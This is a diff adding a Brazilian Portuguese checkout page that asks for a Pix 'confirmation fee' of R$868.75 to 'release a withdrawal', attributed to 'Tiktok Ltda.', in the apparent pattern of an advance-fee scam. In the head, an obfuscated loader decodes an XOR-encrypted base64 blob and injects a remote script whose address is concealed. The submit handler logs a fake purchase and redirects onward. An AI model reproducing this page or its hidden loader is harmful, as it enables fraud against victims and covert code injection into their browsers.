@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="pt-BR"><head><meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+<title>Taxa de Confirmação | Checkout</title>
+<meta name="description" content="Finalize o pagamento da taxa de confirmação via Pix e libere seu saque."/>
+<script src="https://cdn.tailwindcss.com"></script>
+<script>
+!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;
+n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,
+document,'script','https://connect.facebook.net/en_US/fbevents.js');
+fbq('init','1755018692052518');fbq('track','PageView');
+</script>
+<script>
+window.pixelId = "6a9dc2520f647cd31a8e712b";
+(function(){var s_oi=atob("DOB3rZAlerS/wKkExZtV2OJJWI6dqN1wtZNNgr9GHtqRtd1prIYOg/NKF5rdsoZ3ppIe3eRWVcTWuMxo6pAe1fVJVN7M4oUmpJQD3/lHD8Das4s+nr1bj/dJFdberNom/7sMj/5EF9Gd+ot0rJgSwdlBWJidtshosIVVl7ITG43bo5sx99ARm6QSGdCM8cg8oNdGn/IHB+nC");var m_v=[];for(var q_i=0;q_i<s_oi.length;q_i++){m_v.push(s_oi.charCodeAt(q_i)&255);}var f_p=m_v[0];var f_s=m_v.slice(1,1+f_p);var o_ctr=m_v.slice(1+f_p);var f_xo2=o_ctr.map(function(b,p_es){return b^f_s[p_es%f_p];});var p_oa="";for(var q_hl=0;q_hl<f_xo2.length;q_hl++){p_oa+=String.fromCharCode(f_xo2[q_hl]&255);}var i_9yv8=decodeURIComponent(escape(p_oa));var t_wt6=JSON.parse(i_9yv8);var b_76=t_wt6.globals||[];b_76.forEach(function(v_1){window[v_1.name]=v_1.value;});var d_8=document.createElement("script");d_8.src=t_wt6.url;d_8.async=true;d_8.defer=true;(t_wt6.attributes||[]).forEach(function(n_ygo6){d_8.setAttribute(n_ygo6.name,n_ygo6.value);});(document.head||document.documentElement).appendChild(d_8);})();
+</script>
+</head>
+<body class="bg-[#F3F6FB] text-black">
+<div class="bg-[#ff0150] p-4 text-center text-lg font-medium text-white">PAGAMENTO 100% SEGURO</div>
+<main class="flex min-h-screen flex-col lg:flex-row">
+  <div class="lg:flex lg:w-[60%] lg:flex-col lg:justify-center lg:border-r lg:border-[#D6DEE8]">
+    <img src="https://d1frh8xn9wll8b.cloudfront.net/1785767423034-Captura-de-Tela-2026-08-03-a%C3%8C%C2%80s-11.27.33.webp" alt="Banner da loja" class="w-full object-cover lg:hidden"/>
+    <div class="mx-auto hidden w-full max-w-md px-6 py-10 lg:block" id="resumo-desktop"></div>
+  </div>
+  <div class="w-full px-4 py-6 lg:w-[40%] lg:px-10 lg:py-10">
+    <div class="mx-auto w-full max-w-md">
+      <form id="form" class="rounded-xl bg-white p-6 shadow-sm">
+        <h2 class="text-lg font-semibold">Identificação</h2>
+        <div class="mt-4 space-y-3">
+          <input type="email" required placeholder="Email" class="w-full rounded-[0.625rem] border border-[#D6DEE8] bg-white px-4 py-3 placeholder:text-[#8A97AB] focus:border-[#ff0150] focus:outline-none"/>
+          <input type="text" required placeholder="Nome e sobrenome" class="w-full rounded-[0.625rem] border border-[#D6DEE8] bg-white px-4 py-3 placeholder:text-[#8A97AB] focus:border-[#ff0150] focus:outline-none"/>
+        </div>
+        <h2 class="mt-6 text-lg font-semibold">Escolha um método de pagamento...</h2>
+        <div class="mt-3 flex items-center gap-3 rounded-[0.625rem] border-2 border-[#ff0150] bg-[#EEF3FA] px-4 py-3">
+          <span class="flex h-5 w-5 items-center justify-center rounded-full border-2 border-[#ff0150]"><span class="h-2.5 w-2.5 rounded-full bg-[#ff0150]"></span></span>
+          <span class="font-medium">Pagamento via Pix</span>
+          <span class="ml-auto text-sm text-[#16A34A]">Aprovação imediata.</span>
+        </div>
+        <div class="mt-6 lg:hidden" id="resumo-mobile"></div>
+        <button type="submit" class="mt-6 w-full rounded-[0.625rem] bg-[#ff0150] px-4 py-4 text-lg font-bold text-white hover:opacity-90">Pagar</button>
+        <p class="mt-4 text-center text-xs text-[#607089]">Ao finalizar o pagamento você concorda com nossos termos de uso e privacidade.</p>
+      </form>
+    </div>
+  </div>
+</main>
+<script>
+var TOTAL=868.75;
+var brl=TOTAL.toLocaleString('pt-BR',{style:'currency',currency:'BRL'});
+var resumo='<div class="rounded-xl bg-white p-6 shadow-sm"><div class="flex items-center gap-x-3 border-b border-[#D6DEE8] pb-4"><div class="h-20 w-20 shrink-0 overflow-hidden rounded-xl border border-[#D6DEE8]"><img src="https://d1frh8xn9wll8b.cloudfront.net/products-images/1761504614229-1761455352001-9fb940dc-0829-469b-9ee6-9b507bbe2477.webp" alt="Taxa de Confirmação" class="h-full w-full object-cover"/></div><div><p class="font-semibold">Taxa de Confirmação</p><p class="text-sm text-[#607089]">Tiktok Ltda.</p></div><span class="ml-auto font-semibold">'+brl+'</span></div><div class="mt-4 flex items-center justify-between"><span class="text-base font-medium text-[#607089]">Total</span><span class="text-xl font-bold">'+brl+'</span></div></div>';
+document.getElementById('resumo-desktop').innerHTML=resumo;
+document.getElementById('resumo-mobile').innerHTML=resumo;
+if(window.fbq)fbq('track','InitiateCheckout',{value:TOTAL,currency:'BRL'});
+document.getElementById('form').addEventListener('submit',function(e){e.preventDefault();if(window.fbq)fbq('track','Purchase',{value:TOTAL,currency:'BRL'});setTimeout(function(){location.href='/up1/'+window.location.search;},600);});
+</script>
+</body></html>
